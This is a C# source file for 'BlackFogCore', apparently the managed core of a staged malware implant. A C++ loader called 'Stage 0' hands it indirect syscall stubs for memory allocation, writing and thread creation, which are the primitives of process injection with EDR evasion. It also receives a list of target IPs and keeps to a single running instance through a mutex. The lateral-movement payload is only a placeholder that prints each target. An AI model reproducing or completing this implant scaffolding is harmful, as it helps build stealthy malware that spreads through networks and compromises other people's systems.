using System.Runtime.InteropServices;
using System;
using System.Threading;
using System.Net;
using System.Collections.Generic;
using System.Net.Sockets;


namespace BlackFogCore;

//Populated by the native loader: raw pointers to indirect syscall stubs (Nt* wrappers in .asm).
// Must stay layout-compatible with the C++ definition.

[StructLayout(LayoutKind.Sequential)]
public struct SYSCALL_BRIDGE
{
    public IntPtr NtAllocateAddr;
    public IntPtr NtProtectAddr;
    public IntPtr NtWriteAddr;
    public IntPtr NtThreadAddr;
}

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate int NtAllocateVirtualMemory(
    IntPtr processHandle,
    ref IntPtr baseAddress,
    IntPtr zeroBits,
    ref UIntPtr regionSize,
    uint allocationType,
    uint protect);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate int NtProtectVirtualMemory(
    IntPtr processHandle,
    ref IntPtr baseAddress,
    ref UIntPtr regionSize,
    uint newProtect,
    out uint oldProtect);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate int NtWriteVirtualMemory(
    IntPtr processHandle,
    IntPtr baseAddress,
    byte[] buffer,
    uint bufferSize,
    out uint numberOfBytesWritten);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate int NtCreateThreadEx(
    out IntPtr threadHandle,
    uint desiredAccess,
    IntPtr objectAttributes,
    IntPtr processHandle,
    IntPtr startAddress,
    IntPtr parameter,
    bool createSuspended,
    uint stackZeroBits,
    uint sizeOfStackCommit,
    uint sizeOfStackReserve,
    IntPtr bytesBuffer);


// Native AOT entry: bridges to indirect syscalls resolved by Stage 0 (haze.exe).

public class Main
{
    private static NtAllocateVirtualMemory _ntAllocate;
    private static NtWriteVirtualMemory _ntWrite;

    private static List<string> _discoveredHosts = new List<string>();


    // Signaled when native code calls can proceed.

    private static ManualResetEvent _targetsReadyEvent = new ManualResetEvent(false);


    //Native export: called from the C++ loader after BlackFog.dll is mapped. Wires syscall stubs and starts 

    [UnmanagedCallersOnly(EntryPoint = "InitializeCore")]
    public static void InitializeCore(IntPtr bridgePtr)
    {
        Console.WriteLine("[*] C# Core: InitializeCore called by Stage 0.");
        var bridge = Marshal.PtrToStructure<SYSCALL_BRIDGE>(bridgePtr);

        _ntAllocate = Marshal.GetDelegateForFunctionPointer<NtAllocateVirtualMemory>(bridge.NtAllocateAddr);
        _ntWrite = Marshal.GetDelegateForFunctionPointer<NtWriteVirtualMemory>(bridge.NtWriteAddr);

        // Run main logic on a worker thread so the native caller returns immediately.
        Thread coreThread = new Thread(Run);
        coreThread.IsBackground = false;
        coreThread.Start();
    }


    // Mutex guard (single instance), then blocks until Stage 0 pushes IPs via 

    public static void Run()
    {
        string mutexName = @"Global\{B4F06B19-B1AA-45E1-B573-01D9D95E0632}";

        using (Mutex mutex = new Mutex(true, mutexName, out bool createdNew))
        {
            if (!createdNew)
            {
                Console.WriteLine("[-] C# Core: Instance already running. Exiting.");
                return;
            }

            Console.WriteLine("[*] C# Core: Waiting for targets from Stage 0...");

            _targetsReadyEvent.WaitOne();

            Console.WriteLine("\n[*] C# Core: Targets received. Engaging payload phase.");

            var targets = GetDiscoveredHosts();

            if (targets.Count > 0)
            {
                foreach (var ip in targets)
                {
                    // Payload / lateral logic goes here (SMB, etc.).
                    Console.WriteLine($"  [>] Executing logic against: {ip}");
                    Thread.Sleep(500);
                }
                Console.WriteLine("[+] C# Core: All targets processed.");
            }
            else
            {
                Console.WriteLine("[-] C# Core: No targets to process. Idling.");
            }

            while (true)
            {
                // Keep the process alive for demonstration. In a real scenario, you might implement a more graceful shutdown or persistent service logic.
                Thread.Sleep(60000);
            }
        }
    }


    // Native export: Stage 0 passes a packed uint32[n] IPv4 list (host order) and raises the ready event.

    [UnmanagedCallersOnly(EntryPoint = "SetTargets")]
    public static void SetTargets(IntPtr ipArrayPtr, int count)
    {
        Console.WriteLine($"\n[*] C# Core: Stage 0 passed {count} targets. Unpacking...");
        lock (_discoveredHosts)
        {
            _discoveredHosts.Clear();
            for (int i = 0; i < count; i++)
            {
                int rawIp = Marshal.ReadInt32(ipArrayPtr, i * 4);
                string ipStr = new IPAddress(BitConverter.GetBytes(rawIp)).ToString();
                _discoveredHosts.Add(ipStr);
                Console.WriteLine($"  >> [+] Target acquired: {ipStr}");
            }
        }

        _targetsReadyEvent.Set();
    }

    //Returns a snapshot copy for use outside the lock.
    public static List<string> GetDiscoveredHosts()
    {
        lock (_discoveredHosts)
        {
            return new List<string>(_discoveredHosts);
        }
    }
}
